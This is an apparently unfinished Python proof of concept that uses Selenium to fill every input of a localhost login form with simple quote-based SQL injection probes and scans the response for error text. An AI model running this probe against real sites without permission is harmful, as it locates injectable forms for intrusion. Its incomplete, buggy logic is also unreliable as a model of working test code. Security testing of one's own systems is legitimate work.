###POC for SQL attacking###
    #Query form with selenium 
    #Load payload 
    #fill form with payload
    #get the response 

from selenium import webdriver
from selenium.webdriver.common.by import By
from selenium.common.exceptions import (StaleElementReferenceException,
                                       TimeoutException,
                                       UnexpectedAlertPresentException,
                                       NoSuchFrameException,
                                       NoAlertPresentException,
                                       WebDriverException,
                                       InvalidElementStateException
                                       )
from urllib.parse import urlparse, urljoin

import time
import random
import traceback
import os 
import pprint
import json
import string
import re
import requests

driver = webdriver.Chrome()

class SQL:
    def __init__(self,driver,url):
        self.driver = driver
        self.url = url
        
        
    #get from with Selenium  or JavaScipt? -> use JavaScript
    #test with JS
    def get_form(self):
        self.driver.get(self.url)
        elements = self.driver.find_elements(By.TAG_NAME, 'input')   #find xpath form
        return elements
    
    def submit_button(self):
        script = """
                    const submitButton = document.querySelector('input[type="submit"]');
                    return submitButton;
                 """
        submit_bt = self.driver.execute_script(script)
        return submit_bt
            

    def attack(self):
        print('Begining attack the website '+(self.url))
        
        payloads = self.get_sql_payload()
        elements  = self.get_form()
        
        get_submit_bt = self.submit_button()
        
        #submit_bt = elements[len(elements)-1]  -> get button with the last element 
        result_payload =[]
        
        #GET Method with requests library        
        # for element in elements:
        #     for payload in payloads:
        #         r = requests.post(self.url, data={'username':element} )
        #         if (re.search('error',r.text)):
        #             result_payload.append(payload)
        #             print(r.text)
        #             break
        #     print("First attack vector ->" + str(result_payload))
        
        ## cannot sent through Selenium -> send with request 
        for payload in payloads:
            for element in elements:
                try:
                    element.send_keys(payload)
                except Exception as e:
                    print (e)
        
            get_submit_bt.click()
            get_source = self.driver.page_source
            if (re.search("injection", get_source)):       
                f = open("successful_sql.txt", "w")
                f.write("SQL reflect -> "+str(self.url))
                if(re.search("an error", get_source)):      # -> reduce false positive sometime false positive becuase of it appear in the content such as, file name
                    print("Found SQL injection")            
                    break
            else:
                self.driver.quit()
            

    def get_sql_payload(self):  #reference sql payload https://github.com/payloadbox/sql-injection-payload-list need to add more
        sql_payloads = ['injection\'',
                        'injection\"',
                        'injection\,'
                        ]
        return sql_payloads
    
    def check_response(self,s_text, r_text):  #s_text : search text, r_text = result text
        self.s_text = s_text
        self.r_text = r_text
        ##add response 
        #return re.search()
        pass

if __name__ == "__main__":
    SQL(driver,'http://localhost:8090/users/login.php').attack()



    

